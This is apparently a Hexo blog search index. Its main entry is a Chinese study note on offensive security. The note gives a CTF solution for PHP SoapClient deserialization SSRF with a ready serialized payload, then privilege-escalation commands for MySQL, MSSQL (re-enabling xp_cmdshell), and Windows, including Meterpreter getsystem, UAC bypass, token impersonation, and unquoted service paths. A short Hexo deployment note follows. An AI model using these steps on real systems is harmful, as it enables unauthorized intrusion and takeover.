<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>0.md</title>
      <link href="/0-md/"/>
      <url>/0-md/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/22/"/>
      <url>/22/</url>
      
        <content type="html"><![CDATA[<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="1-php反序列化"><a href="#1-php反序列化" class="headerlink" title="1. php反序列化"></a>1. php反序列化</h4><ol><li><p>魔术方法的调用逻辑，比如触发条件和顺序</p></li><li><p>语言原生类的调用逻辑，如SoapClient</p></li><li><p>语言自身的安全缺陷，cve-2016-7124，如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，</p><p> 但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p></li></ol><p><strong>主要解释原生类调用逻辑，不注重具体题目细节</strong>：ctfshow  反序列化 web259</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br><span class="line"></span><br><span class="line">构造：</span><br><span class="line">&lt;?php</span><br><span class="line">$ua = &quot;kradress\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27;, &#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($client));</span><br><span class="line"></span><br><span class="line">O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:17:&quot;http://127.0.0.1/&quot;;s:8:&quot;location&quot;;s:25:&quot;http://127.0.0.1/flag.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:132:&quot;kradressX-Forwarded-For:+127.0.0.1,127.0.0.1Content-Type:+application/x-www-form-urlencodedContent-Length:+13token=ctfshow&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>在传入vip参数值后，进行反序列化，SoapClient就是构造利用的原生(默认自带)类，然后vip(即SoapClient类)去调用getFlag()方法，因为SoapClient中没有getFlag方法，</p><p>也就是说SoapClient类调用了一个不存在的函数，它就会去调用__call()方法，交给__call()方法解析SoapClient的的参数，然后通过SOAP协议与远程服务器进行通信，执行实际的SOAP调用</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><strong>数据库提权</strong>：</p><ol><li>网站存在高权限sql注入点</li><li>数据库的存储文件或备份文件</li><li>网站应用源码中的数据库配置文件</li><li>工具或脚本爆破(需解决外连问题)</li></ol><h4 id="MySQL：UDF-MOF-开机启动项-反弹shell"><a href="#MySQL：UDF-MOF-开机启动项-反弹shell" class="headerlink" title="MySQL：UDF  MOF  开机启动项 反弹shell"></a>MySQL：UDF  MOF  开机启动项 反弹shell</h4><p><strong>UDF</strong>：</p><p>mysql默认root用户不开启外联  </p><p>一、开启外联命令：GRANT ALL PRIVILEGES ON *.* TO ‘root‘@’%’ IDENTIFIED BY ‘root’ WITH GRANT OPTION;</p><p>二、查看secure-file-priv是否有目录限制 show global variables like”secure%”</p><p>1、当secure_file_priv 的值为 NULL ，表示限制mysqld 不允许导入|导出，无法进行提权。</p><p>2、当secure_file_priv 的值为 c:&#x2F; ，表示限制 mysqld 的导入|导出只能发生在c盘目录下，无法进行提权。</p><p>3、当 secure_file_priv的值没有具体值时，表示不对 mysqld 的导入|导出做限制，可以提权。</p><p><strong>mof</strong>：</p><p>利用 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F; 目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行</p><p>MOF提权条件：server2003及以下版本       mysql启动身份具有权限去读写c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof目录        secure-file-priv参数不为null</p><h4 id="MSSQL：xp-cmdshell-sp-oacreate-沙盒"><a href="#MSSQL：xp-cmdshell-sp-oacreate-沙盒" class="headerlink" title="MSSQL：xp_cmdshell  sp_oacreate 沙盒"></a>MSSQL：xp_cmdshell  sp_oacreate 沙盒</h4><p>MSSQL默认sa用户支持外连</p><p>xp_cmdshell禁用时：通过命令再去启用     用sp_oacreate</p><p>sp_oacreate禁用时：通过命令再去启用     用xp_cmdshell</p><p>如果删除xp_cmdshell，重新加载：dbcc addextendedproc(“xp_cmdshell”,”xplog70.dll”);</p><p>如果xplog70.dll也被删除，那就通过命令恢复：exec master.sys.sp_addextendedproc ‘xp_cmdshell’, ‘C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll’;</p><p>上面都不能解决，那就通过沙盒模式提权</p><h4 id="Oracle：普通用户-注入提升模式-DBA模式"><a href="#Oracle：普通用户-注入提升模式-DBA模式" class="headerlink" title="Oracle：普通用户  注入提升模式  DBA模式"></a>Oracle：普通用户  注入提升模式  DBA模式</h4><h3 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h3><p><strong>win本地用户</strong>：</p><p>at命令、sc命令、psexec</p><p>进程迁移注入：1. 用工具pinjector  2.通过msf命令migrate PID号</p><p>令牌窃取：1.用incognito.exe  2.通过msf     use incognito   list_tokens -u   impersonate_token “NT AUTHORITY\SYSTEM”</p><p>烂土豆提权</p><p>直接通过meterpreter&gt;getsystem            如果UAC开启：getsystem无法成功，使用msf的exploit&#x2F;windows&#x2F;local&#x2F;bypassuac</p><p>如果UAC开到了最高级别用exploit&#x2F;windows&#x2F;local&#x2F;ask 受害主机会弹窗，如果点确定就可以再getsystem提至system权限</p><img src="/22/image-20240419101912783.png" class="" title="image-20240419101912783"><p>如果UAC开到最高</p><img src="/22/image-20240419102450442.png" class="" title="image-20240419102450442"><p>exploit&#x2F;windows&#x2F;local&#x2F;ask</p><img src="/22/image-20240419102835339.png" class="" title="image-20240419102835339"><img src="/22/image-20240419103155547.png" class="" title="image-20240419103155547"><p><strong>bypassUAC</strong>：</p><p>msf，UACME，powershell</p><p><strong>dll劫持</strong>：windows程序启动的时候需要dll，如果这些dll不存在，则可以通过在应用程序要查找的位置放置恶意dll来提权</p><p><strong>不带引号服务路径</strong>：services.msc中的服务点击后查看”可执行文件的路径:”</p><p>带引号 有空格的目录是一个整体 “C:\Program Files (x86)\Kingsoft\office6\wpscloudsvr.exe” LocalService </p><p>不带引号  有空格的目录就会认为是文件加参数 类似于cmd执行命令 C:\Program Files (x86)\Kingsoft\office6\wpscloudsvr.exe LocalService</p><p>首先通过工具找到服务中不带引号的，上传马到C:\上去命名为Program.exe，当点击启用这个服务时，会去执行C:\Program.exe，而不是原来完整的</p><p><a href="https://github.com/411Hall/JAWS">ps脚本jaws-enum.ps1</a></p><p>运行可能会报错，可以通过powershell命令set-executionpolicy remotesigned（这是win7上的，win10是不一样的，我是通过get-help about_signing调试的）</p><p>powershell默认是restricted</p><img src="/22/image-20240419222847280.png" class="" title="image-20240419222847280">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo与github</title>
      <link href="/hexo%E4%B8%8Egithub/"/>
      <url>/hexo%E4%B8%8Egithub/</url>
      
        <content type="html"><![CDATA[<p>hexo部署github：本地git连接配置好后部署 hexo d(hexo deploy)</p><p>github仓库repositority的操作：</p><p>备份操作</p><ol><li><p>git pull<a href="https://github.com/Optimussrc/Optimussrc.github.io.git">https://github.com/Optimussrc/Optimussrc.github.io.git</a>  克隆到本地文件夹(-b branch)</p></li><li><p>git push origin main（注：先cd进那个文件中，不然会报错）</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
